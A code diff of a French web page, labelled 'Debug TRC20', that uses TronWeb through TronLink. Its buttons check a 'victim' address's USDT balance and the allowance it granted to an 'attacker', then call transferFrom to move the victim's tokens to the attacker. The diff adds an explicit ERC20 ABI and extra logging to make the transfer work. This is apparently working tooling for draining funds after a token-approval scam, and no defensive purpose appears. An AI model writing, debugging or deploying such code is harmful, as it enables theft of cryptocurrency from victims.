@@ -2,16 +2,16 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
-  <title>Debug TRC20 - Solde, Allowance, transferFrom</title>
+  <title>Debug TRC20 avec ABI explicite</title>
   <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
   <style>
     body { font-family: monospace; white-space: pre-wrap; }
     button { margin: 5px 0; padding: 10px; width: 100%; font-size: 1.1em; }
-    #output { margin-top: 10px; background: #f0f0f0; padding: 10px; height: 250px; overflow-y: auto; border: 1px solid #ccc; }
+    #output { margin-top: 10px; background: #f0f0f0; padding: 10px; height: 300px; overflow-y: auto; border: 1px solid #ccc; }
   </style>
 </head>
 <body>
-  <h2>Debug TRC20 - Solde, Allowance, transferFrom</h2>
+  <h2>Debug TRC20 avec ABI explicite</h2>
 
   <button onclick="checkTronWeb()">🔎 Vérifier état TronLink</button>
   <button onclick="checkBalance()">1️⃣ Vérifier solde USDT de la victime</button>
@@ -34,12 +34,43 @@
       output.scrollTop = output.scrollHeight;
     }
 
+    // ABI minimale ERC20
+    const erc20Abi = [
+      {
+        "constant":true,
+        "inputs":[{"name":"_owner","type":"address"}],
+        "name":"balanceOf",
+        "outputs":[{"name":"balance","type":"uint256"}],
+        "type":"function"
+      },
+      {
+        "constant":true,
+        "inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],
+        "name":"allowance",
+        "outputs":[{"name":"remaining","type":"uint256"}],
+        "type":"function"
+      },
+      {
+        "constant":false,
+        "inputs":[
+          {"name":"_from","type":"address"},
+          {"name":"_to","type":"address"},
+          {"name":"_value","type":"uint256"}
+        ],
+        "name":"transferFrom",
+        "outputs":[{"name":"success","type":"bool"}],
+        "type":"function"
+      }
+    ];
+
     async function checkTronWeb() {
       if (window.tronWeb && window.tronWeb.ready) {
-        log("✅ TronWeb est connecté !");
-        log("Adresse active : " + window.tronWeb.defaultAddress.base58);
+        log("✅ TronWeb connecté !");
+        log("Adresse active (base58) : " + window.tronWeb.defaultAddress.base58);
+        log("Adresse active (hex) : " + window.tronWeb.defaultAddress.hex);
+        log("Node utilisé : " + window.tronWeb.fullNode.host);
       } else {
-        log("❌ TronWeb non prêt. Connecte-toi via TronLink.");
+        log("❌ TronWeb non connecté. Connecte-toi via TronLink.");
       }
     }
 
@@ -47,42 +78,41 @@
       if (!window.tronWeb || !window.tronWeb.ready) {
         throw new Error("TronWeb non connecté");
       }
-      return await window.tronWeb.contract().at(tokenAddress);
+      return await window.tronWeb.contract(erc20Abi, tokenAddress);
     }
 
     async function checkBalance() {
       try {
-        log("⏳ Vérification du solde en cours...");
+        log("⏳ Vérification du solde...");
         const contract = await getTokenContract();
         const balance = await contract.balanceOf(victim).call();
         log(`💰 Solde victime (${victim}): ${balance / 1_000_000} USDT`);
       } catch (e) {
-        log("❌ Erreur lors du checkBalance : " + (e.message || e));
+        log("❌ Erreur checkBalance : " + (e.message || e));
       }
     }
 
     async function checkAllowance() {
       try {
-        log("⏳ Vérification de l'autorisation en cours...");
+        log("⏳ Vérification autorisation...");
         const contract = await getTokenContract();
-        // allowance(owner, spender)
         const allowance = await contract.allowance(victim, attacker).call();
-        log(`🔐 Autorisation donnée par la victime à l'attaquant : ${allowance / 1_000_000} USDT`);
+        log(`🔐 Autorisation victime → attaquant : ${allowance / 1_000_000} USDT`);
       } catch (e) {
-        log("❌ Erreur lors du checkAllowance : " + (e.message || e));
+        log("❌ Erreur checkAllowance : " + (e.message || e));
       }
     }
 
     async function runTransferFrom() {
       try {
-        log("⏳ Tentative d'exécution de transferFrom...");
+        log("⏳ Exécution transferFrom...");
         const contract = await getTokenContract();
         const tx = await contract.transferFrom(victim, attacker, amount).send({
           feeLimit: 2_000_000
         });
         log(`🚀 transferFrom envoyé, txID : ${tx}`);
       } catch (e) {
-        log("❌ Erreur lors du transferFrom : " + (e.message || e));
+        log("❌ Erreur transferFrom : " + (e.message || e));
       }
     }
   </script>
